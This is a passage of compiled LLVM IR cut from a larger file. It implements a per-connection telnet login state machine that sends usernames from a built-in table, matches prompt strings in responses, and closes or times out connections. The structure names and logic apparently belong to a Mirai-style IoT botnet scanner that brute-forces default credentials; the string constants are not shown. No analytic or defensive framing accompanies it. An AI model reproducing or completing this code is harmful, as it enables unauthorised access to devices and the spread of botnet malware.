  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 7
  store i16 0, i16* %534, align 16
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 8
  %539 = load i8*, i8** %538, align 8
  %540 = call i8* @strstr(i8* %539, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %541 = icmp ne i8* %540, null
  br i1 %541, label %542, label %547

; <label>:542:                                    ; preds = %526
  %543 = load i32, i32* %2, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %544
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %545, i32 0, i32 2
  store i8 5, i8* %546, align 8
  br label %553

; <label>:547:                                    ; preds = %526
  %548 = load i32, i32* %2, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 8
  %552 = load i8*, i8** %551, align 8
  call void @llvm.memset.p0i8.i64(i8* %552, i8 0, i64 1024, i32 1, i1 false)
  br label %553

; <label>:553:                                    ; preds = %547, %542
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 2
  store i8 3, i8* %557, align 8
  br label %2304

; <label>:558:                                    ; preds = %507
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 8
  %568 = load i8*, i8** %567, align 8
  %569 = load i32, i32* %2, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 7
  %573 = load i16, i16* %572, align 16
  %574 = zext i16 %573 to i32
  %575 = call i32 @readUntil(i32 %563, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %568, i32 1024, i32 %574)
  %576 = icmp ne i32 %575, 0
  br i1 %576, label %577, label %609

; <label>:577:                                    ; preds = %558
  %578 = load i32, i32* %2, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %579
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %580, i32 0, i32 6
  store i32 0, i32* %581, align 4
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 7
  store i16 0, i16* %585, align 16
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 8
  %590 = load i8*, i8** %589, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %598

; <label>:593:                                    ; preds = %577
  %594 = load i32, i32* %2, align 4
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %595
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %596, i32 0, i32 2
  store i8 5, i8* %597, align 8
  br label %604

; <label>:598:                                    ; preds = %577
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 8
  %603 = load i8*, i8** %602, align 8
  call void @llvm.memset.p0i8.i64(i8* %603, i8 0, i64 1024, i32 1, i1 false)
  br label %604

; <label>:604:                                    ; preds = %598, %593
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 2
  store i8 3, i8* %608, align 8
  br label %2304

; <label>:609:                                    ; preds = %558
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 0
  %614 = load i32, i32* %613, align 16
  %615 = load i32, i32* %2, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %616
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %617, i32 0, i32 8
  %619 = load i8*, i8** %618, align 8
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 7
  %624 = load i16, i16* %623, align 16
  %625 = zext i16 %624 to i32
  %626 = call i32 @readUntil(i32 %614, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %619, i32 1024, i32 %625)
  %627 = icmp ne i32 %626, 0
  br i1 %627, label %628, label %660

; <label>:628:                                    ; preds = %609
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 6
  store i32 0, i32* %632, align 4
  %633 = load i32, i32* %2, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 7
  store i16 0, i16* %636, align 16
  %637 = load i32, i32* %2, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 8
  %641 = load i8*, i8** %640, align 8
  %642 = call i8* @strstr(i8* %641, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %643 = icmp ne i8* %642, null
  br i1 %643, label %644, label %649

; <label>:644:                                    ; preds = %628
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 2
  store i8 5, i8* %648, align 8
  br label %655

; <label>:649:                                    ; preds = %628
  %650 = load i32, i32* %2, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 8
  %654 = load i8*, i8** %653, align 8
  call void @llvm.memset.p0i8.i64(i8* %654, i8 0, i64 1024, i32 1, i1 false)
  br label %655

; <label>:655:                                    ; preds = %649, %644
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 2
  store i8 3, i8* %659, align 8
  br label %2304

; <label>:660:                                    ; preds = %609
  %661 = load i32, i32* %2, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 8
  %665 = load i8*, i8** %664, align 8
  %666 = call i64 @strlen(i8* %665) #10
  %667 = trunc i64 %666 to i16
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 7
  store i16 %667, i16* %671, align 16
  br label %672

; <label>:672:                                    ; preds = %660
  br label %673

; <label>:673:                                    ; preds = %672
  br label %674

; <label>:674:                                    ; preds = %673
  br label %675

; <label>:675:                                    ; preds = %674
  br label %676

; <label>:676:                                    ; preds = %675
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 6
  %681 = load i32, i32* %680, align 4
  %682 = add i32 %681, 10
  %683 = zext i32 %682 to i64
  %684 = call i64 @time(i64* null) #2
  %685 = icmp slt i64 %683, %684
  br i1 %685, label %686, label %701

; <label>:686:                                    ; preds = %676
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 16
  %692 = call i32 @sclose(i32 %691)
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 2
  store i8 0, i8* %696, align 8
  %697 = load i32, i32* %2, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 3
  store i8 1, i8* %700, align 1
  br label %701

; <label>:701:                                    ; preds = %686, %676
  br label %2303

; <label>:702:                                    ; preds = %69
  %703 = load i32, i32* %2, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 0
  %707 = load i32, i32* %706, align 16
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 4
  %712 = load i8, i8* %711, align 2
  %713 = zext i8 %712 to i64
  %714 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %713
  %715 = load i8*, i8** %714, align 8
  %716 = load i32, i32* %2, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %717
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %718, i32 0, i32 4
  %720 = load i8, i8* %719, align 2
  %721 = zext i8 %720 to i64
  %722 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %721
  %723 = load i8*, i8** %722, align 8
  %724 = call i64 @strlen(i8* %723) #10
  %725 = call i64 @send(i32 %707, i8* %715, i64 %724, i32 16384)
  %726 = icmp slt i64 %725, 0
  br i1 %726, label %727, label %742

; <label>:727:                                    ; preds = %702
  %728 = load i32, i32* %2, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 16
  %733 = call i32 @sclose(i32 %732)
  %734 = load i32, i32* %2, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 2
  store i8 0, i8* %737, align 8
  %738 = load i32, i32* %2, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 3
  store i8 1, i8* %741, align 1
  br label %2304

; <label>:742:                                    ; preds = %702
  %743 = load i32, i32* %2, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 0
  %747 = load i32, i32* %746, align 16
  %748 = call i64 @send(i32 %747, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %749 = icmp slt i64 %748, 0
  br i1 %749, label %750, label %765

; <label>:750:                                    ; preds = %742
  %751 = load i32, i32* %2, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 0
  %755 = load i32, i32* %754, align 16
  %756 = call i32 @sclose(i32 %755)
  %757 = load i32, i32* %2, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 2
  store i8 0, i8* %760, align 8
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 3
  store i8 1, i8* %764, align 1
  br label %2304

; <label>:765:                                    ; preds = %742
  %766 = load i32, i32* %2, align 4
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %767
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %768, i32 0, i32 2
  store i8 4, i8* %769, align 8
  br label %2303

; <label>:770:                                    ; preds = %69
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 6
  %775 = load i32, i32* %774, align 4
  %776 = icmp eq i32 %775, 0
  br i1 %776, label %777, label %784

; <label>:777:                                    ; preds = %770
  %778 = call i64 @time(i64* null) #2
  %779 = trunc i64 %778 to i32
  %780 = load i32, i32* %2, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 6
  store i32 %779, i32* %783, align 4
  br label %784

; <label>:784:                                    ; preds = %777, %770
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 16
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 8
  %794 = load i8*, i8** %793, align 8
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 7
  %799 = load i16, i16* %798, align 16
  %800 = zext i16 %799 to i32
  %801 = call i32 @readUntil(i32 %789, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %794, i32 1024, i32 %800)
  %802 = icmp ne i32 %801, 0
  br i1 %802, label %803, label %835

; <label>:803:                                    ; preds = %784
  %804 = load i32, i32* %2, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 6
  store i32 0, i32* %807, align 4
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 7
  store i16 0, i16* %811, align 16
  %812 = load i32, i32* %2, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 8
  %816 = load i8*, i8** %815, align 8
  %817 = call i8* @strstr(i8* %816, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %818 = icmp ne i8* %817, null
  br i1 %818, label %819, label %824

; <label>:819:                                    ; preds = %803
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 2
  store i8 5, i8* %823, align 8
  br label %829

; <label>:824:                                    ; preds = %803
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 2
  store i8 7, i8* %828, align 8
  br label %829

; <label>:829:                                    ; preds = %824, %819
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
  %834 = load i8*, i8** %833, align 8
  call void @llvm.memset.p0i8.i64(i8* %834, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:835:                                    ; preds = %784
  %836 = load i32, i32* %2, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %837
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %838, i32 0, i32 0
  %840 = load i32, i32* %839, align 16
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 8
  %845 = load i8*, i8** %844, align 8
  %846 = load i32, i32* %2, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 7
  %850 = load i16, i16* %849, align 16
  %851 = zext i16 %850 to i32
  %852 = call i32 @readUntil(i32 %840, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %845, i32 1024, i32 %851)
  %853 = icmp ne i32 %852, 0
  br i1 %853, label %854, label %886

; <label>:854:                                    ; preds = %835
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 6
  store i32 0, i32* %858, align 4
  %859 = load i32, i32* %2, align 4
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %860
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %861, i32 0, i32 7
  store i16 0, i16* %862, align 16
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 8
  %867 = load i8*, i8** %866, align 8
  %868 = call i8* @strstr(i8* %867, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %869 = icmp ne i8* %868, null
  br i1 %869, label %870, label %875

; <label>:870:                                    ; preds = %854
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 2
  store i8 5, i8* %874, align 8
  br label %880

; <label>:875:                                    ; preds = %854
  %876 = load i32, i32* %2, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 2
  store i8 7, i8* %879, align 8
  br label %880

; <label>:880:                                    ; preds = %875, %870
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 8
  %885 = load i8*, i8** %884, align 8
  call void @llvm.memset.p0i8.i64(i8* %885, i8 0, i64 1024, i32 1, i1 false)
  br label %2304

; <label>:886:                                    ; preds = %835
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 8
  %891 = load i8*, i8** %890, align 8
  %892 = call i8* @strstr(i8* %891, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %893 = icmp ne i8* %892, null
  br i1 %893, label %894, label %909

; <label>:894:                                    ; preds = %886
  %895 = load i32, i32* %2, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 0
  %899 = load i32, i32* %898, align 16
  %900 = call i32 @sclose(i32 %899)
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 2
  store i8 0, i8* %904, align 8
  %905 = load i32, i32* %2, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 3
  store i8 0, i8* %908, align 1
  br label %2304

; <label>:909:                                    ; preds = %886
  %910 = load i32, i32* %2, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 8
  %914 = load i8*, i8** %913, align 8
  %915 = call i8* @strstr(i8* %914, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %916 = icmp ne i8* %915, null
  br i1 %916, label %917, label %932

; <label>:917:                                    ; preds = %909
  %918 = load i32, i32* %2, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %919
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %920, i32 0, i32 0
  %922 = load i32, i32* %921, align 16
  %923 = call i32 @sclose(i32 %922)
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 2
  store i8 0, i8* %927, align 8
  %928 = load i32, i32* %2, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 3
  store i8 0, i8* %931, align 1
  br label %2304

; <label>:932:                                    ; preds = %909
  %933 = load i32, i32* %2, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 8
  %937 = load i8*, i8** %936, align 8
  %938 = call i8* @strstr(i8* %937, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %939 = icmp ne i8* %938, null
  br i1 %939, label %940, label %955

; <label>:940:                                    ; preds = %932
  %941 = load i32, i32* %2, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 0
  %945 = load i32, i32* %944, align 16
  %946 = call i32 @sclose(i32 %945)
  %947 = load i32, i32* %2, align 4
  %948 = sext i32 %947 to i64
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %948
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %949, i32 0, i32 2
  store i8 0, i8* %950, align 8
  %951 = load i32, i32* %2, align 4
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %952
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %953, i32 0, i32 3
  store i8 0, i8* %954, align 1
  br label %2304

; <label>:955:                                    ; preds = %932
  %956 = load i32, i32* %2, align 4
  %957 = sext i32 %956 to i64
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %957
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %958, i32 0, i32 8
  %960 = load i8*, i8** %959, align 8
  %961 = call i8* @strstr(i8* %960, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %962 = icmp ne i8* %961, null
  br i1 %962, label %963, label %978

; <label>:963:                                    ; preds = %955
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 0
  %968 = load i32, i32* %967, align 16
  %969 = call i32 @sclose(i32 %968)
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %972, i32 0, i32 2
  store i8 0, i8* %973, align 8
  %974 = load i32, i32* %2, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 3
  store i8 0, i8* %977, align 1
  br label %2304

; <label>:978:                                    ; preds = %955
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 8
  %983 = load i8*, i8** %982, align 8
  %984 = call i8* @strstr(i8* %983, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %985 = icmp ne i8* %984, null
  br i1 %985, label %986, label %1001

; <label>:986:                                    ; preds = %978
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 0
  %991 = load i32, i32* %990, align 16
  %992 = call i32 @sclose(i32 %991)
  %993 = load i32, i32* %2, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %994
